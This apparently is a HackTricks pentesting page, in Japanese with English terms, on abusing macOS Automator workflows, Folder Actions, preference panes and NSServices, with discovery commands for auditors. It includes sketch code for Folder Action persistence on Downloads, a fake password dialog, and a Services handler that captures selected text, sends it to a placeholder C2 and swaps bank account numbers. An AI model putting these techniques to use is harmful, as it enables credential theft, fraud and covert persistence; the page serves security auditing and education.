# macOS Automator、Preference Panes、NSServices の Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions と Workflows

### Basic Information

**Automator** は macOS の visual automation tool です。**actions**（` .action` bundles）で構成された **workflows**（`.workflow` bundles）を実行します。Automator は **Folder Actions**、**Quick Actions**、**Shortcuts** integration も支えています。最近の macOS では、workflows を **Shortcuts** に **import** することもできるため、同じ malicious logic が Finder の Quick Action、`~/Library/Services/` 配下の user service、または legacy Automator actions を基盤とする shortcut として表示される場合があります。

Automator actions は、workflow の実行時に Automator runtime によって load される **plugins** です。以下を実行できます。
- 任意の shell scripts を実行する
- files と data を処理する
- AppleScript を介して applications と interaction する
- 複雑な automation のために連結する

### Why This Matters

> [!WARNING]
> Automator workflows は、**social-engineering** によって実行へ誘導される可能性があります — 単純な document files のように見えるためです。`.workflow` bundle には、workflow の実行時に実行される embedded shell commands を含めることができます。Folder Actions と組み合わせることで、file events を trigger とする **automatic persistence** を実現できます。最近の Gatekeeper fixes により、**app-bundled Quick Actions**（`Contents/PlugIns/*.workflow`）も harmless data ではなく executable content として扱う必要があることが示されました。

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

`.workflow` bundle は、ほとんどのユーザーには通常のドキュメントファイルのように見えます:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actionsは、監視対象のフォルダにファイルが追加された際にworkflowを自動実行します：
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions は再起動後も維持され、静かに実行されます。`~/Downloads` に Folder Action を設定すると、Safari、Chrome、AirDrop、メール添付ファイルなどからダウンロードされたファイルを含め、**ダウンロードされたすべてのファイルが payload をトリガーします**。また、`System Events` はデフォルトの `~/Library/Scripts/Folder Action Scripts` の場所の外部にあるスクリプトを指す Folder Actions も登録できるため、分散したパスの探索にも価値があります。関連する TCC の影響については、[TCC page](../macos-security-protections/macos-tcc/README.md) を確認してください。

---

## Preference Panes

### 基本情報

Preference panes（`.prefPane` bundles）は、**System Settings**（以前の System Preferences）からロードされる plugins です。システムまたは third-party 機能向けの設定 UI パネルを提供します。古いシステムでは `System Preferences` が直接ロードしていましたが、新しいリリースでは third-party panes は通常、System Settings から起動される **legacy loader XPC service** によって仲介されます。

### 重要な理由

- Preference panes は、System Settings / System Preferences が spawn する **trusted host process** 内で実行される
- 現代のシステムでは、その host が **`legacyLoader` XPC service** の場合があるため、重要な境界は依然として **trusted Apple UI process -> third-party code loading**
- Third-party preference panes は、UI に付与された **host process security context** と user trust を継承する
- ユーザーは Preference panes を **double-click** してインストールするため、social engineering が容易
- 一度インストールされると **persist** し、System Settings がそのパネルを開くたびにロードされる

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### 攻撃: Privilege Context Hijacking

悪意のある preference pane は、**pane host** の security context を継承します（従来は `System Preferences`、新しいバージョンでは多くの場合、`System Settings` によって起動される `legacyLoader` helper）。
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Attack: インストールによる永続化
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### 攻撃: UI Phishing

preference pane は正規の system UI panel を模倣して、**認証情報を phishing** できます:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### 基本情報

**NSServices** により、アプリケーションは **Services menu**（右クリック → Services）を通じて他のアプリに機能を提供できます。ユーザーがテキストやデータを選択して service を呼び出すと、選択したデータが処理のために **service provider** に送信されます。

Services はアプリケーションの `Info.plist` で `NSServices` キーの下に宣言され、pasteboard server（`pbs`）に登録されます。macOS は **service cache** と **restriction policy** も保持しており、どの Services を表示するか、また sandboxed caller に追加の警告を表示するかを決定します。

### これが重要な理由

- Services は **cross-application data flow** を受け取るため、あらゆるアプリケーションで選択されたテキストが service に送信される
- 悪意のある service は、password manager、email client、financial app からデータを取得できる
- Services は呼び出し元のアプリケーションに **modified data** を返せる（selection operation に対する man-in-the-middle）
- Service 名は、正規のものに見えるように作成できる（「Format Text」、「Encrypt Selection」、「Share」など）
- オプションの `NSRestricted` flag は security-relevant である。unrestricted としてマークされた service は、macOS が escape-prone services に対して表示する警告なしに、sandboxed app から呼び出し可能になる場合がある<sup>[2]</sup>

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attack: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### 攻撃: Data Modification（Man-in-the-Middle）

サービスは、正規の機能を提供しているように見せかけながら、**返されるデータを変更**できます。
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple は、各 service definition にオプションの `NSRestricted` boolean を指定できます。これが設定されている場合、その service が **sandbox または privacy boundary から escape** する助けになる可能性があるため、macOS は sandboxed caller に警告します。攻撃者の視点では、これにより次の 2 つの有用な監査パスが得られます。

- Apple Events、file access、その他の privileged action を proxy するにもかかわらず、restricted としてマークされていない **third-party service** を探す
- 強力な entitlement を持つ **high-value built-in service**（たとえば、Script Editor や Finder-backed helper によって公開される service）を探し、user interaction だけで data-access primitive に変えられるか確認する

最近の良い例として **CVE-2022-48574** があります。この脆弱性では、Services mechanism を悪用して、想定される confirmation flow なしに **TCC-protected user files** にアクセスできました。バグは修正済みですが、この technique は threat modeling において今も有用です。caller に代わって file access や automation request を転送する service は、同じように厳しく検証する必要があります。<sup>[2]</sup>

---

## Recent Security Notes

- **Quick Actions are executable content**: Apple は 2024 年、app-bundled Automator Quick Action が通常の assessment なしに実行される可能性がある Gatekeeper bypass を修正しました。アプリを監査する際は、helper script や login item を調査する場合と同じように、`Contents/PlugIns/*.workflow/Contents/document.wflow` を確認してください。[Gatekeeper のページ](../macos-security-protections/macos-gatekeeper.md)を参照してください。<sup>[1]</sup>
- **Shortcuts can inherit legacy Automator behavior**: Apple は、third-party shortcut が **legacy Automator action** を使用して、想定される permission flow なしに Apple Events を送信していたことが判明した後、追加の user-consent prompt も導入しました。import された workflow と shortcut bundle については、`Run AppleScript`、`Run Shell Script`、および同様の bridge action を確認してください。[TCC のページ](../macos-security-protections/macos-tcc/README.md)を参照してください。
- **Automator is still a live privacy boundary**: Apple は 2025 年、protected user data への access に関する別の Automator fix を提供しました。Automator が legacy surface であっても、あらゆる workflow runner、Quick Action host、automation bridge は dead code ではなく、現在も有効な attack surface として扱ってください。

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### 環境設定パネル → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Password Managerの窃取
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## 参考文献

- [1] [Apple — macOS Ventura 13.7、Sonoma 14.7、Sequoia 15のセキュリティコンテンツについて](https://support.apple.com/en-us/121238)
- [2] [Moonlock — macOSでNSServices exploitがどのように機能したか](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
